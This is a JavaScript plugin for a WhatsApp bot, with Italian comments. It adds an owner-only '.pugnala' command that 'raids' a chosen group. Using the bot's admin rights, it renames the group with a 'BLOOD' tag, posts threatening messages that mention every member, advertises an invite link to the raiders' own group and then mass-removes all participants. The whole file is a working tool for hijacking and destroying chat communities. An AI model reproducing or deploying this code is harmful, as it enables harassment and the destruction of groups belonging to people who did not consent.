let handler = async (m, { conn, text, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    // Recuperiamo tutti i gruppi in cui è presente il bot
    let getGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(getGroups);

    // --- LOGICA CHAT PRIVATA ---
    if (!m.isGroup) {
        if (groups.length === 0) return m.reply("❌ Il bot non è in alcun gruppo.");

        // Se l'utente ha scritto solo ".pugnala"
        if (!text) {
            let txt = "🩸 *Scegli il gruppo da devastare:*\n\n";
            groups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\nID: \`${g.id}\`\n\n`;
            });
            txt += `👉 Rispondi con *.${command} [numero]*`;
            return m.reply(txt);
        }

        // Se l'utente ha scelto un numero (es. .pugnala 1)
        let index = parseInt(text) - 1;
        if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido.");

        var targetChat = groups[index].id;
        var targetSubject = groups[index].subject;
        await m.reply(`⚔️ Tentativo di attacco a: *${targetSubject}*...`);
    } else {
        // --- LOGICA SE USATO DIRETTAMENTE IN GRUPPO ---
        var targetChat = m.chat;
    }

    // --- ESECUZIONE AZIONE ---
    try {
        const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        let metadata = await conn.groupMetadata(targetChat);
        let participants = metadata.participants;
        
        // Controllo se il bot è admin nel gruppo target
        let botAsAdmin = participants.find(p => p.id === botId)?.admin;
        if (!botAsAdmin) return m.reply(`❌ Errore: Il bot non è admin in "${metadata.subject}".`);

        // 1. Cambio Nome
        let newName = `${metadata.subject} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`;
        await conn.groupUpdateSubject(targetChat, newName);

        // 2. Filtro utenti (escludi bot e owner)
        let usersToRemove = participants
            .map(p => p.id)
            .filter(jid => jid !== botId && !ownerJids.includes(jid));

        // 3. Invio Messaggi
        await conn.sendMessage(targetChat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎. 𝐈𝐥 𝐝𝐞𝐯𝐚𝐬𝐭𝐨 𝐜𝐡𝐞 𝐚𝐦𝐦𝐚𝐳𝐳𝐞𝐫𝐚̀ 𝐭𝐮𝐭𝐭𝐢 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐜𝐨𝐦𝐞 𝐮𝐧𝐚 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐚, 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐪𝐮𝐞𝐥𝐥𝐚 𝐜𝐡𝐞 𝐯𝐢 𝐝𝐚𝐫𝐚̀."
        });

        await conn.sendMessage(targetChat, {
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐯𝐢 𝐚𝐬𝐩𝐞𝐭𝐭𝐢𝐚𝐦𝐨 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐚:\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: participants.map(p => p.id)
        });

        // 4. Rimozione forzata
        if (usersToRemove.length > 0) {
            await conn.groupParticipantsUpdate(targetChat, usersToRemove, 'remove');
        }

        if (!m.isGroup) m.reply(`✅ Operazione completata su *${metadata.subject}*!`);

    } catch (e) {
        console.error(e);
        m.reply("❌ Errore critico: " + e.message);
    }
};

handler.command = ['pugnala'];
handler.owner = true;

export default handler;
